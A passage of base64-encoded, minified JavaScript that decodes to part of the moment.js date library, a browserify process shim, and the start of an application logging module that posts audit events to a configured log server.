GZ1bmN0aW9uKGUsbil7blt3cl09Mj09PWUubGVuZ3RoP3QucGFyc2VUd29EaWdpdFllYXIoZSk6dihlKX0pLCQoIllZIixmdW5jdGlvbihlLG4pe25bd3JdPXQucGFyc2VUd29EaWdpdFllYXIoZSl9KSwkKCJZIixmdW5jdGlvbihlLHQpe3Rbd3JdPXBhcnNlSW50KGUsMTApfSksdC5wYXJzZVR3b0RpZ2l0WWVhcj1mdW5jdGlvbihlKXtyZXR1cm4gdihlKSsodihlKT42OD8xOTAwOjJlMyl9O3ZhciBKcj1QKCJGdWxsWWVhciIsITEpO3QuSVNPXzg2MDE9ZnVuY3Rpb24oKXt9O3ZhciAkcj1hZSgibW9tZW50KCkubWluIGlzIGRlcHJlY2F0ZWQsIHVzZSBtb21lbnQubWluIGluc3RlYWQuIGh0dHBzOi8vZ2l0aHViLmNvbS9tb21lbnQvbW9tZW50L2lzc3Vlcy8xNTQ4IixmdW5jdGlvbigpew0KdmFyIGU9UGUuYXBwbHkobnVsbCxhcmd1bWVudHMpO3JldHVybiB0aGlzLmlzVmFsaWQoKSYmZS5pc1ZhbGlkKCk/dGhpcz5lP3RoaXM6ZTpmKCl9KSxCcj1hZSgibW9tZW50KCkubWF4IGlzIGRlcHJlY2F0ZWQsIHVzZSBtb21lbnQubWF4IGluc3RlYWQuIGh0dHBzOi8vZ2l0aHViLmNvbS9tb21lbnQvbW9tZW50L2lzc3Vlcy8xNTQ4IixmdW5jdGlvbigpe3ZhciBlPVBlLmFwcGx5KG51bGwsYXJndW1lbnRzKTtyZXR1cm4gdGhpcy5pc1ZhbGlkKCkmJmUuaXNWYWxpZCgpP2U+dGhpcz90aGlzOmU6ZigpfSksVnI9ZnVuY3Rpb24oKXtyZXR1cm4gRGF0ZS5ub3c/RGF0ZS5ub3coKTorbmV3IERhdGV9O1JlKCJaIiwiOiIpLFJlKCJaWiIsIiIpLFUoIloiLHZyKSxVKCJaWiIsdnIpLCQoWyJaIiwiWloiXSxmdW5jdGlvbihlLHQsbil7bi5fdXNlVVRDPSEwLG4uX3R6bT1OZSh2cixlKX0pO3ZhciBHcj0vKFtcK1wtXXxcZFxkKS9naTt0LnVwZGF0ZU9mZnNldD1mdW5jdGlvbigpe307dmFyIFhyPS9eKFwtKT8oPzooXGQqKVsuIF0pPyhcZCspXDooXGQrKSg/Olw6KFxkKylcLj8oXGR7M30pP1xkKik/JC8sUXI9L14oLSk/UCg/Oig/OihbMC05LC5dKilZKT8oPzooWzAtOSwuXSopTSk/KD86KFswLTksLl0qKUQpPyg/OlQoPzooWzAtOSwuXSopSCk/KD86KFswLTksLl0qKU0pPyg/OihbMC05LC5dKilTKT8pP3woWzAtOSwuXSopVykkLztaZS5mbj1BZS5wcm90b3R5cGU7dmFyIEtyPXJ0KDEsImFkZCIpLFpyPXJ0KC0xLCJzdWJ0cmFjdCIpO3QuZGVmYXVsdEZvcm1hdD0iWVlZWS1NTS1ERFRISDptbTpzc1oiO3ZhciBlaT1hZSgibW9tZW50KCkubGFuZygpIGlzIGRlcHJlY2F0ZWQuIEluc3RlYWQsIHVzZSBtb21lbnQoKS5sb2NhbGVEYXRhKCkgdG8gZ2V0IHRoZSBsYW5ndWFnZSBjb25maWd1cmF0aW9uLiBVc2UgbW9tZW50KCkubG9jYWxlKCkgdG8gY2hhbmdlIGxhbmd1YWdlcy4iLGZ1bmN0aW9uKGUpe3JldHVybiB2b2lkIDA9PT1lP3RoaXMubG9jYWxlRGF0YSgpOnRoaXMubG9jYWxlKGUpfSk7TygwLFsiZ2ciLDJdLDAsZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy53ZWVrWWVhcigpJTEwMH0pLE8oMCxbIkdHIiwyXSwwLGZ1bmN0aW9uKCl7cmV0dXJuIHRoaXMuaXNvV2Vla1llYXIoKSUxMDB9KSxBdCgiZ2dnZyIsIndlZWtZZWFyIiksQXQoImdnZ2dnIiwid2Vla1llYXIiKSxBdCgiR0dHRyIsImlzb1dlZWtZZWFyIiksQXQoIkdHR0dHIiwiaXNvV2Vla1llYXIiKSxTKCJ3ZWVrWWVhciIsImdnIiksUygiaXNvV2Vla1llYXIiLCJHRyIpLFUoIkciLHlyKSxVKCJnIix5ciksVSgiR0ciLGxyLG9yKSxVKCJnZyIsbHIsb3IpLFUoIkdHR0ciLHByLHVyKSxVKCJnZ2dnIixwcix1ciksVSgiR0dHR0ciLF9yLGNyKSxVKCJnZ2dnZyIsX3IsY3IpLEIoWyJnZ2dnIiwiZ2dnZ2ciLCJHR0dHIiwiR0dHR0ciXSxmdW5jdGlvbihlLHQsbixyKXt0W3Iuc3Vic3RyKDAsMildPXYoZSl9KSxCKFsiZ2ciLCJHRyJdLGZ1bmN0aW9uKGUsbixyLGkpe25baV09dC5wYXJzZVR3b0RpZ2l0WWVhcihlKX0pLE8oIlEiLDAsIlFvIiwicXVhcnRlciIpLFMoInF1YXJ0ZXIiLCJRIiksVSgiUSIsc3IpLCQoIlEiLGZ1bmN0aW9uKGUsdCl7dFtUcl09MyoodihlKS0xKX0pLE8oInciLFsid3ciLDJdLCJ3byIsIndlZWsiKSxPKCJXIixbIldXIiwyXSwiV28iLCJpc29XZWVrIiksUygid2VlayIsInciKSxTKCJpc29XZWVrIiwiVyIpLFUoInciLGxyKSxVKCJ3dyIsbHIsb3IpLFUoIlciLGxyKSxVKCJXVyIsbHIsb3IpLEIoWyJ3Iiwid3ciLCJXIiwiV1ciXSxmdW5jdGlvbihlLHQsbixyKXt0W3Iuc3Vic3RyKDAsMSldPXYoZSl9KTt2YXIgdGk9e2RvdzowLGRveTo2fTtPKCJEIixbIkREIiwyXSwiRG8iLCJkYXRlIiksUygiZGF0ZSIsIkQiKSxVKCJEIixsciksVSgiREQiLGxyLG9yKSxVKCJEbyIsZnVuY3Rpb24oZSx0KXtyZXR1cm4gZT90Ll9vcmRpbmFsUGFyc2U6dC5fb3JkaW5hbFBhcnNlTGVuaWVudH0pLCQoWyJEIiwiREQiXSxZciksJCgiRG8iLGZ1bmN0aW9uKGUsdCl7dFtZcl09dihlLm1hdGNoKGxyKVswXSwxMCl9KTt2YXIgbmk9UCgiRGF0ZSIsITApO08oImQiLDAsImRvIiwiZGF5IiksTygiZGQiLDAsMCxmdW5jdGlvbihlKXtyZXR1cm4gdGhpcy5sb2NhbGVEYXRhKCkud2Vla2RheXNNaW4odGhpcyxlKX0pLE8oImRkZCIsMCwwLGZ1bmN0aW9uKGUpe3JldHVybiB0aGlzLmxvY2FsZURhdGEoKS53ZWVrZGF5c1Nob3J0KHRoaXMsZSl9KSxPKCJkZGRkIiwwLDAsZnVuY3Rpb24oZSl7cmV0dXJuIHRoaXMubG9jYWxlRGF0YSgpLndlZWtkYXlzKHRoaXMsZSl9KSxPKCJlIiwwLDAsIndlZWtkYXkiKSxPKCJFIiwwLDAsImlzb1dlZWtkYXkiKSxTKCJkYXkiLCJkIiksUygid2Vla2RheSIsImUiKSxTKCJpc29XZWVrZGF5IiwiRSIpLFUoImQiLGxyKSxVKCJlIixsciksVSgiRSIsbHIpLFUoImRkIixNciksVSgiZGRkIixNciksVSgiZGRkZCIsTXIpLEIoWyJkZCIsImRkZCIsImRkZGQiXSxmdW5jdGlvbihlLHQsbixyKXt2YXIgaT1uLl9sb2NhbGUud2Vla2RheXNQYXJzZShlLHIsbi5fc3RyaWN0KTtudWxsIT1pP3QuZD1pOmQobikuaW52YWxpZFdlZWtkYXk9ZX0pLEIoWyJkIiwiZSIsIkUiXSxmdW5jdGlvbihlLHQsbixyKXt0W3JdPXYoZSl9KTt2YXIgcmk9IlN1bmRheV9Nb25kYXlfVHVlc2RheV9XZWRuZXNkYXlfVGh1cnNkYXlfRnJpZGF5X1NhdHVyZGF5Ii5zcGxpdCgiXyIpLGlpPSJTdW5fTW9uX1R1ZV9XZWRfVGh1X0ZyaV9TYXQiLnNwbGl0KCJfIiksc2k9IlN1X01vX1R1X1dlX1RoX0ZyX1NhIi5zcGxpdCgiXyIpO08oIkRERCIsWyJEREREIiwzXSwiREREbyIsImRheU9mWWVhciIpLFMoImRheU9mWWVhciIsIkRERCIpLFUoIkRERCIsZnIpLFUoIkREREQiLGFyKSwkKFsiREREIiwiRERERCJdLGZ1bmN0aW9uKGUsdCxuKXtuLl9kYXlPZlllYXI9dihlKX0pLE8oIkgiLFsiSEgiLDJdLDAsImhvdXIiKSxPKCJoIixbImhoIiwyXSwwLHNuKSxPKCJobW0iLDAsMCxmdW5jdGlvbigpe3JldHVybiIiK3NuLmFwcGx5KHRoaXMpK0EodGhpcy5taW51dGVzKCksMil9KSxPKCJobW1zcyIsMCwwLGZ1bmN0aW9uKCl7cmV0dXJuIiIrc24uYXBwbHkodGhpcykrQSh0aGlzLm1pbnV0ZXMoKSwyKStBKHRoaXMuc2Vjb25kcygpLDIpfSksTygiSG1tIiwwLDAsZnVuY3Rpb24oKXtyZXR1cm4iIit0aGlzLmhvdXJzKCkrQSh0aGlzLm1pbnV0ZXMoKSwyKX0pLE8oIkhtbXNzIiwwLDAsZnVuY3Rpb24oKXtyZXR1cm4iIit0aGlzLmhvdXJzKCkrQSh0aGlzLm1pbnV0ZXMoKSwyKStBKHRoaXMuc2Vjb25kcygpLDIpfSksb24oImEiLCEwKSxvbigiQSIsITEpLFMoImhvdXIiLCJoIiksVSgiYSIsYW4pLFUoIkEiLGFuKSxVKCJIIixsciksVSgiaCIsbHIpLFUoIkhIIixscixvciksVSgiaGgiLGxyLG9yKSxVKCJobW0iLGRyKSxVKCJobW1zcyIsaHIpLFUoIkhtbSIsZHIpLFUoIkhtbXNzIixociksJChbIkgiLCJISCJdLERyKSwkKFsiYSIsIkEiXSxmdW5jdGlvbihlLHQsbil7bi5faXNQbT1uLl9sb2NhbGUuaXNQTShlKSxuLl9tZXJpZGllbT1lfSksJChbImgiLCJoaCJdLGZ1bmN0aW9uKGUsdCxuKXt0W0RyXT12KGUpLGQobikuYmlnSG91cj0hMH0pLCQoImhtbSIsZnVuY3Rpb24oZSx0LG4pe3ZhciByPWUubGVuZ3RoLTI7dFtEcl09dihlLnN1YnN0cigwLHIpKSx0W1NyXT12KGUuc3Vic3RyKHIpKSxkKG4pLmJpZ0hvdXI9ITB9KSwkKCJobW1zcyIsZnVuY3Rpb24oZSx0LG4pe3ZhciByPWUubGVuZ3RoLTQsaT1lLmxlbmd0aC0yO3RbRHJdPXYoZS5zdWJzdHIoMCxyKSksdFtTcl09dihlLnN1YnN0cihyLDIpKSx0W3hyXT12KGUuc3Vic3RyKGkpKSxkKG4pLmJpZ0hvdXI9ITB9KSwkKCJIbW0iLGZ1bmN0aW9uKGUsdCxuKXt2YXIgcj1lLmxlbmd0aC0yO3RbRHJdPXYoZS5zdWJzdHIoMCxyKSksdFtTcl09dihlLnN1YnN0cihyKSl9KSwkKCJIbW1zcyIsZnVuY3Rpb24oZSx0LG4pe3ZhciByPWUubGVuZ3RoLTQsaT1lLmxlbmd0aC0yO3RbRHJdPXYoZS5zdWJzdHIoMCxyKSksdFtTcl09dihlLnN1YnN0cihyLDIpKSx0W3hyXT12KGUuc3Vic3RyKGkpKX0pO3ZhciBvaT0vW2FwXVwuP20/XC4/L2ksYWk9UCgiSG91cnMiLCEwKTtPKCJtIixbIm1tIiwyXSwwLCJtaW51dGUiKSxTKCJtaW51dGUiLCJtIiksVSgibSIsbHIpLFUoIm1tIixscixvciksJChbIm0iLCJtbSJdLFNyKTt2YXIgdWk9UCgiTWludXRlcyIsITEpO08oInMiLFsic3MiLDJdLDAsInNlY29uZCIpLFMoInNlY29uZCIsInMiKSxVKCJzIixsciksVSgic3MiLGxyLG9yKSwkKFsicyIsInNzIl0seHIpO3ZhciBjaT1QKCJTZWNvbmRzIiwhMSk7TygiUyIsMCwwLGZ1bmN0aW9uKCl7cmV0dXJufn4odGhpcy5taWxsaXNlY29uZCgpLzEwMCl9KSxPKDAsWyJTUyIsMl0sMCxmdW5jdGlvbigpe3JldHVybn5+KHRoaXMubWlsbGlzZWNvbmQoKS8xMCl9KSxPKDAsWyJTU1MiLDNdLDAsIm1pbGxpc2Vjb25kIiksTygwLFsiU1NTUyIsNF0sMCxmdW5jdGlvbigpe3JldHVybiAxMCp0aGlzLm1pbGxpc2Vjb25kKCl9KSxPKDAsWyJTU1NTUyIsNV0sMCxmdW5jdGlvbigpe3JldHVybiAxMDAqdGhpcy5taWxsaXNlY29uZCgpfSksTygwLFsiU1NTU1NTIiw2XSwwLGZ1bmN0aW9uKCl7cmV0dXJuIDFlMyp0aGlzLm1pbGxpc2Vjb25kKCl9KSxPKDAsWyJTU1NTU1NTIiw3XSwwLGZ1bmN0aW9uKCl7cmV0dXJuIDFlNCp0aGlzLm1pbGxpc2Vjb25kKCl9KSxPKDAsWyJTU1NTU1NTUyIsOF0sMCxmdW5jdGlvbigpe3JldHVybiAxZTUqdGhpcy5taWxsaXNlY29uZCgpfSksTygwLFsiU1NTU1NTU1NTIiw5XSwwLGZ1bmN0aW9uKCl7cmV0dXJuIDFlNip0aGlzLm1pbGxpc2Vjb25kKCl9KSxTKCJtaWxsaXNlY29uZCIsIm1zIiksVSgiUyIsZnIsc3IpLFUoIlNTIixmcixvciksVSgiU1NTIixmcixhcik7dmFyIGxpO2ZvcihsaT0iU1NTUyI7bGkubGVuZ3RoPD05O2xpKz0iUyIpVShsaSxtcik7Zm9yKGxpPSJTIjtsaS5sZW5ndGg8PTk7bGkrPSJTIikkKGxpLGxuKTt2YXIgZGk9UCgiTWlsbGlzZWNvbmRzIiwhMSk7TygieiIsMCwwLCJ6b25lQWJiciIpLE8oInp6IiwwLDAsInpvbmVOYW1lIik7dmFyIGhpPW0ucHJvdG90eXBlO2hpLmFkZD1LcixoaS5jYWxlbmRhcj1zdCxoaS5jbG9uZT1vdCxoaS5kaWZmPWZ0LGhpLmVuZE9mPVR0LGhpLmZvcm1hdD15dCxoaS5mcm9tPWd0LGhpLmZyb21Ob3c9dnQsaGkudG89YnQsaGkudG9Ob3c9TXQsaGkuZ2V0PUMsaGkuaW52YWxpZEF0PUZ0LGhpLmlzQWZ0ZXI9YXQsaGkuaXNCZWZvcmU9dXQsaGkuaXNCZXR3ZWVuPWN0LGhpLmlzU2FtZT1sdCxoaS5pc1NhbWVPckFmdGVyPWR0LGhpLmlzU2FtZU9yQmVmb3JlPWh0LGhpLmlzVmFsaWQ9UHQsaGkubGFuZz1laSxoaS5sb2NhbGU9THQsaGkubG9jYWxlRGF0YT1rdCxoaS5tYXg9QnIsaGkubWluPSRyLGhpLnBhcnNpbmdGbGFncz1FdCxoaS5zZXQ9QyxoaS5zdGFydE9mPXd0LGhpLnN1YnRyYWN0PVpyLGhpLnRvQXJyYXk9eHQsaGkudG9PYmplY3Q9anQsaGkudG9EYXRlPVN0LGhpLnRvSVNPU3RyaW5nPW10LGhpLnRvSlNPTj1IdCxoaS50b1N0cmluZz1fdCxoaS51bml4PUR0LGhpLnZhbHVlT2Y9WXQsaGkuY3JlYXRpb25EYXRhPUN0LGhpLnllYXI9SnIsaGkuaXNMZWFwWWVhcj1fZSxoaS53ZWVrWWVhcj1PdCxoaS5pc29XZWVrWWVhcj1SdCxoaS5xdWFydGVyPWhpLnF1YXJ0ZXJzPXp0LGhpLm1vbnRoPWVlLGhpLmRheXNJbk1vbnRoPXRlLGhpLndlZWs9aGkud2Vla3M9QnQsaGkuaXNvV2Vlaz1oaS5pc29XZWVrcz1WdCxoaS53ZWVrc0luWWVhcj1JdCxoaS5pc29XZWVrc0luWWVhcj1OdCxoaS5kYXRlPW5pLGhpLmRheT1oaS5kYXlzPWVuLGhpLndlZWtkYXk9dG4saGkuaXNvV2Vla2RheT1ubixoaS5kYXlPZlllYXI9cm4saGkuaG91cj1oaS5ob3Vycz1haSxoaS5taW51dGU9aGkubWludXRlcz11aSxoaS5zZWNvbmQ9aGkuc2Vjb25kcz1jaSxoaS5taWxsaXNlY29uZD1oaS5taWxsaXNlY29uZHM9ZGksaGkudXRjT2Zmc2V0PVVlLGhpLnV0Yz1xZSxoaS5sb2NhbD1KZSxoaS5wYXJzZVpvbmU9JGUsaGkuaGFzQWxpZ25lZEhvdXJPZmZzZXQ9QmUsaGkuaXNEU1Q9VmUsaGkuaXNEU1RTaGlmdGVkPUdlLGhpLmlzTG9jYWw9WGUsaGkuaXNVdGNPZmZzZXQ9UWUsaGkuaXNVdGM9S2UsaGkuaXNVVEM9S2UsaGkuem9uZUFiYnI9ZG4saGkuem9uZU5hbWU9aG4saGkuZGF0ZXM9YWUoImRhdGVzIGFjY2Vzc29yIGlzIGRlcHJlY2F0ZWQuIFVzZSBkYXRlIGluc3RlYWQuIixuaSksaGkubW9udGhzPWFlKCJtb250aHMgYWNjZXNzb3IgaXMgZGVwcmVjYXRlZC4gVXNlIG1vbnRoIGluc3RlYWQiLGVlKSxoaS55ZWFycz1hZSgieWVhcnMgYWNjZXNzb3IgaXMgZGVwcmVjYXRlZC4gVXNlIHllYXIgaW5zdGVhZCIsSnIpLGhpLnpvbmU9YWUoIm1vbWVudCgpLnpvbmUgaXMgZGVwcmVjYXRlZCwgdXNlIG1vbWVudCgpLnV0Y09mZnNldCBpbnN0ZWFkLiBodHRwczovL2dpdGh1Yi5jb20vbW9tZW50L21vbWVudC9pc3N1ZXMvMTc3OSIsemUpO3ZhciBmaT1oaSxwaT17c2FtZURheToiW1RvZGF5IGF0XSBMVCIsbmV4dERheToiW1RvbW9ycm93IGF0XSBMVCIsbmV4dFdlZWs6ImRkZGQgW2F0XSBMVCIsbGFzdERheToiW1llc3RlcmRheSBhdF0gTFQiLGxhc3RXZWVrOiJbTGFzdF0gZGRkZCBbYXRdIExUIixzYW1lRWxzZToiTCJ9LF9pPXtMVFM6Img6bW06c3MgQSIsTFQ6Img6bW0gQSIsTDoiTU0vREQvWVlZWSIsTEw6Ik1NTU0gRCwgWVlZWSIsTExMOiJNTU1NIEQsIFlZWVkgaDptbSBBIixMTExMOiJkZGRkLCBNTU1NIEQsIFlZWVkgaDptbSBBIn0sbWk9IkludmFsaWQgZGF0ZSIseWk9IiVkIixnaT0vXGR7MSwyfS8sdmk9e2Z1dHVyZToiaW4gJXMiLHBhc3Q6IiVzIGFnbyIsczoiYSBmZXcgc2Vjb25kcyIsbToiYSBtaW51dGUiLG1tOiIlZCBtaW51dGVzIixoOiJhbiBob3VyIixoaDoiJWQgaG91cnMiLGQ6ImEgZGF5IixkZDoiJWQgZGF5cyIsTToiYSBtb250aCIsTU06IiVkIG1vbnRocyIseToiYSB5ZWFyIix5eToiJWQgeWVhcnMifSxiaT1NLnByb3RvdHlwZTtiaS5fY2FsZW5kYXI9cGksYmkuY2FsZW5kYXI9X24sYmkuX2xvbmdEYXRlRm9ybWF0PV9pLGJpLmxvbmdEYXRlRm9ybWF0PW1uLGJpLl9pbnZhbGlkRGF0ZT1taSxiaS5pbnZhbGlkRGF0ZT15bixiaS5fb3JkaW5hbD15aSxiaS5vcmRpbmFsPWduLGJpLl9vcmRpbmFsUGFyc2U9Z2ksYmkucHJlcGFyc2U9dm4sYmkucG9zdGZvcm1hdD12bixiaS5fcmVsYXRpdmVUaW1lPXZpLGJpLnJlbGF0aXZlVGltZT1ibixiaS5wYXN0RnV0dXJlPU1uLGJpLnNldD1MbixiaS5tb250aHM9WCxiaS5fbW9udGhzPUZyLGJpLm1vbnRoc1Nob3J0PVEsYmkuX21vbnRoc1Nob3J0PUNyLGJpLm1vbnRoc1BhcnNlPUssYmkuX21vbnRoc1JlZ2V4PU9yLGJpLm1vbnRoc1JlZ2V4PXJlLGJpLl9tb250aHNTaG9ydFJlZ2V4PUFyLGJpLm1vbnRoc1Nob3J0UmVnZXg9bmUsYmkud2Vlaz1xdCxiaS5fd2Vlaz10aSxiaS5maXJzdERheU9mWWVhcj0kdCxiaS5maXJzdERheU9mV2Vlaz1KdCxiaS53ZWVrZGF5cz1YdCxiaS5fd2Vla2RheXM9cmksYmkud2Vla2RheXNNaW49S3QsYmkuX3dlZWtkYXlzTWluPXNpLGJpLndlZWtkYXlzU2hvcnQ9UXQsYmkuX3dlZWtkYXlzU2hvcnQ9aWksYmkud2Vla2RheXNQYXJzZT1adCxiaS5pc1BNPXVuLGJpLl9tZXJpZGllbVBhcnNlPW9pLGJpLm1lcmlkaWVtPWNuLFQoImVuIix7b3JkaW5hbFBhcnNlOi9cZHsxLDJ9KHRofHN0fG5kfHJkKS8sb3JkaW5hbDpmdW5jdGlvbihlKXt2YXIgdD1lJTEwLG49MT09PXYoZSUxMDAvMTApPyJ0aCI6MT09PXQ/InN0IjoyPT09dD8ibmQiOjM9PT10PyJyZCI6InRoIjtyZXR1cm4gZStufX0pLHQubGFuZz1hZSgibW9tZW50LmxhbmcgaXMgZGVwcmVjYXRlZC4gVXNlIG1vbWVudC5sb2NhbGUgaW5zdGVhZC4iLFQpLHQubGFuZ0RhdGE9YWUoIm1vbWVudC5sYW5nRGF0YSBpcyBkZXByZWNhdGVkLiBVc2UgbW9tZW50LmxvY2FsZURhdGEgaW5zdGVhZC4iLEQpO3ZhciBNaT1NYXRoLmFicyxMaT1JbigibXMiKSxraT1JbigicyIpLHdpPUluKCJtIiksVGk9SW4oImgiKSxZaT1JbigiZCIpLERpPUluKCJ3IiksU2k9SW4oIk0iKSx4aT1JbigieSIpLGppPVVuKCJtaWxsaXNlY29uZHMiKSxIaT1Vbigic2Vjb25kcyIpLFBpPVVuKCJtaW51dGVzIiksRWk9VW4oImhvdXJzIiksRmk9VW4oImRheXMiKSxDaT1VbigibW9udGhzIiksQWk9VW4oInllYXJzIiksT2k9TWF0aC5yb3VuZCxSaT17czo0NSxtOjQ1LGg6MjIsZDoyNixNOjExfSxOaT1NYXRoLmFicyxJaT1BZS5wcm90b3R5cGU7SWkuYWJzPWpuLElpLmFkZD1QbixJaS5zdWJ0cmFjdD1FbixJaS5hcz1SbixJaS5hc01pbGxpc2Vjb25kcz1MaSxJaS5hc1NlY29uZHM9a2ksSWkuYXNNaW51dGVzPXdpLElpLmFzSG91cnM9VGksSWkuYXNEYXlzPVlpLElpLmFzV2Vla3M9RGksSWkuYXNNb250aHM9U2ksSWkuYXNZZWFycz14aSxJaS52YWx1ZU9mPU5uLElpLl9idWJibGU9Q24sSWkuZ2V0PVduLElpLm1pbGxpc2Vjb25kcz1qaSxJaS5zZWNvbmRzPUhpLElpLm1pbnV0ZXM9UGksSWkuaG91cnM9RWksSWkuZGF5cz1GaSxJaS53ZWVrcz16bixJaS5tb250aHM9Q2ksSWkueWVhcnM9QWksSWkuaHVtYW5pemU9Qm4sSWkudG9JU09TdHJpbmc9Vm4sSWkudG9TdHJpbmc9Vm4sSWkudG9KU09OPVZuLElpLmxvY2FsZT1MdCxJaS5sb2NhbGVEYXRhPWt0LElpLnRvSXNvU3RyaW5nPWFlKCJ0b0lzb1N0cmluZygpIGlzIGRlcHJlY2F0ZWQuIFBsZWFzZSB1c2UgdG9JU09TdHJpbmcoKSBpbnN0ZWFkIChub3RpY2UgdGhlIGNhcGl0YWxzKSIsVm4pLElpLmxhbmc9ZWksTygiWCIsMCwwLCJ1bml4IiksTygieCIsMCwwLCJ2YWx1ZU9mIiksVSgieCIseXIpLFUoIlgiLGJyKSwkKCJYIixmdW5jdGlvbihlLHQsbil7bi5fZD1uZXcgRGF0ZSgxZTMqcGFyc2VGbG9hdChlLDEwKSl9KSwkKCJ4IixmdW5jdGlvbihlLHQsbil7bi5fZD1uZXcgRGF0ZSh2KGUpKX0pLHQudmVyc2lvbj0iMi4xMS4yIixyKFBlKSx0LmZuPWZpLHQubWluPUZlLHQubWF4PUNlLHQubm93PVZyLHQudXRjPWMsdC51bml4PWZuLHQubW9udGhzPVRuLHQuaXNEYXRlPXMsdC5sb2NhbGU9VCx0LmludmFsaWQ9Zix0LmR1cmF0aW9uPVplLHQuaXNNb21lbnQ9eSx0LndlZWtkYXlzPURuLHQucGFyc2Vab25lPXBuLHQubG9jYWxlRGF0YT1ELHQuaXNEdXJhdGlvbj1PZSx0Lm1vbnRoc1Nob3J0PVluLHQud2Vla2RheXNNaW49eG4sdC5kZWZpbmVMb2NhbGU9WSx0LndlZWtkYXlzU2hvcnQ9U24sdC5ub3JtYWxpemVVbml0cz14LHQucmVsYXRpdmVUaW1lVGhyZXNob2xkPSRuLHQucHJvdG90eXBlPWZpO3ZhciBXaT10O3JldHVybiBXaX0pfSkuY2FsbCh0LG4oMjAzKShlKSl9DQovKiBtb21lbnQuanMgLS0+ICovDQosDQovKiA8IS0tIGJyb3dzZXJpZnkuanMgKi8NCmZ1bmN0aW9uKGUsdCl7ZnVuY3Rpb24gbigpe2M9ITEsby5sZW5ndGg/dT1vLmNvbmNhdCh1KTpsPS0xLHUubGVuZ3RoJiZyKCl9ZnVuY3Rpb24gcigpe2lmKCFjKXt2YXIgZT1zZXRUaW1lb3V0KG4pO2M9ITA7Zm9yKHZhciB0PXUubGVuZ3RoO3Q7KXtmb3Iobz11LHU9W107KytsPHQ7KW8mJm9bbF0ucnVuKCk7bD0tMSx0PXUubGVuZ3RofW89bnVsbCxjPSExLGNsZWFyVGltZW91dChlKX19ZnVuY3Rpb24gaShlLHQpe3RoaXMuZnVuPWUsdGhpcy5hcnJheT10fWZ1bmN0aW9uIHMoKXt9dmFyIG8sYT1lLmV4cG9ydHM9e30sdT1bXSxjPSExLGw9LTE7YS5uZXh0VGljaz1mdW5jdGlvbihlKXt2YXIgdD1uZXcgQXJyYXkoYXJndW1lbnRzLmxlbmd0aC0xKTtpZihhcmd1bWVudHMubGVuZ3RoPjEpZm9yKHZhciBuPTE7bjxhcmd1bWVudHMubGVuZ3RoO24rKyl0W24tMV09YXJndW1lbnRzW25dO3UucHVzaChuZXcgaShlLHQpKSwxIT09dS5sZW5ndGh8fGN8fHNldFRpbWVvdXQociwwKX0saS5wcm90b3R5cGUucnVuPWZ1bmN0aW9uKCl7dGhpcy5mdW4uYXBwbHkobnVsbCx0aGlzLmFycmF5KX0sYS50aXRsZT0iYnJvd3NlciIsYS5icm93c2VyPSEwLGEuZW52PXt9LGEuYXJndj1bXSxhLnZlcnNpb249IiIsYS52ZXJzaW9ucz17fSxhLm9uPXMsYS5hZGRMaXN0ZW5lcj1zLGEub25jZT1zLGEub2ZmPXMsYS5yZW1vdmVMaXN0ZW5lcj1zLGEucmVtb3ZlQWxsTGlzdGVuZXJzPXMsYS5lbWl0PXMsYS5iaW5kaW5nPWZ1bmN0aW9uKGUpe3Rocm93IG5ldyBFcnJvcigicHJvY2Vzcy5iaW5kaW5nIGlzIG5vdCBzdXBwb3J0ZWQiKX0sYS5jd2Q9ZnVuY3Rpb24oKXtyZXR1cm4iLyJ9LGEuY2hkaXI9ZnVuY3Rpb24oZSl7dGhyb3cgbmV3IEVycm9yKCJwcm9jZXNzLmNoZGlyIGlzIG5vdCBzdXBwb3J0ZWQiKX0sYS51bWFzaz1mdW5jdGlvbigpe3JldHVybiAwfX0NCi8qIGJyb3dzZXJpZnkuanMgLS0+ICovDQosDQovKiA8IS0tIHNvbWUgc29ydCBvZiBkZWJ1ZyByZXBvcnRpbmcgc2NyaXB0ICovDQpmdW5jdGlvbihlLHQsbil7ZnVuY3Rpb24gcigpe3ZhciBlPW4oNCksdD17ZGVidWc6MSxpbmZvOjIsd2FybjozLGVycm9yOjR9LHI9dS5leHRlbmQoe3NhdmVfbG9nOiExLHNhdmVfYXVkaXQ6ITEsbG9nX2xldmVsOiJpbmZvIn0sZS5nbG9iYWxDb25maWcuZ2V0KCJsb2dfY29uZmlnIikpO3JldHVybiBlLnVzZXJzLmZvckVhY2goZnVuY3Rpb24oZSl7dmFyIG49ZS5nZXQoImxvZ19jb25maWciKXx8e307bi5zYXZlX2xvZyYmKHIuc2F2ZV9sb2c9ITApLG4uc2F2ZV9hdWRpdCYmKHIuc2F2ZV9hdWRpdD0hMCksdFtuLmxvZ19sZXZlbF0mJnRbbi5sb2dfbGV2ZWxdPHRbci5sb2dfbGV2ZWxdJiYoci5sb2dfbGV2ZWw9bi5sb2dfbGV2ZWwpfSkscn1mdW5jdGlvbiBpKCl7aWYoIWwmJjAhPT1hLmxlbmd0aCYmd2luZG93Lm5hdmlnYXRvci5vbkxpbmUpe2w9ITA7dmFyIGU9big1KSx0PWEuc2hpZnQoKTtjKHttZXRob2Q6InBvc3QiLHVybDplLmxvZ191cmwrIi9ldmVudCIsZGF0YTp0LG9uU3VjY2VzczpmdW5jdGlvbigpe2w9ITEsY29uc29sZS5ncm91cENvbGxhcHNlZCgiQXVkaXQgc2VudDoiLHQudHlwZSksdS5lYWNoKHQsZnVuY3Rpb24oZSx0KXt2YXIgbj0iJXM6ICVjJXMlYyI7Im9iamVjdCI9PXR5cGVvZiBlJiYobj0iJXM6ICVjJU8lYyIpLGNvbnNvbGUubG9nKG4sdCwiZm9udC13ZWlnaHQ6IGJvbGQiLGUsImZvbnQtd2VpZ2h0OiBub3JtYWwiKX0pLGNvbnNvbGUuZ3JvdXBFbmQoKSxzZXRUaW1lb3V0KGksMCl9LG9uRmFpbHVyZTpmdW5jdGlvbihlKXtsPSExLGNvbnNvbGUuZXJyb3IoImF1ZGl0IFBPU1QgZmFpbGVkOiAiK2UpLGEudW5zaGlmdCh0KX19KX19ZnVuY3Rpb24gcyhlKXt2YXIgdD1uZXcgRGF0ZShlKTtyZXR1cm4gdC50b1RpbWVTdHJpbmcoKS5yZXBsYWNlKC8gLiovLCIiKX12YXIgbz1bXSxhPVtdLHU9big4KSxjPW4oMTkpLGw9ITEsZD1mdW5jdGlvbigpe3RoaXMuaW5pdC5hcHBseSh0aGlzLGFyZ3VtZW50cyl9OyFmdW5jdGlvbihlKXtlLnRhZz0iIixlLmluaXQ9ZnVuY3Rpb24oZSl7dGhpcy50YWc9InN0cml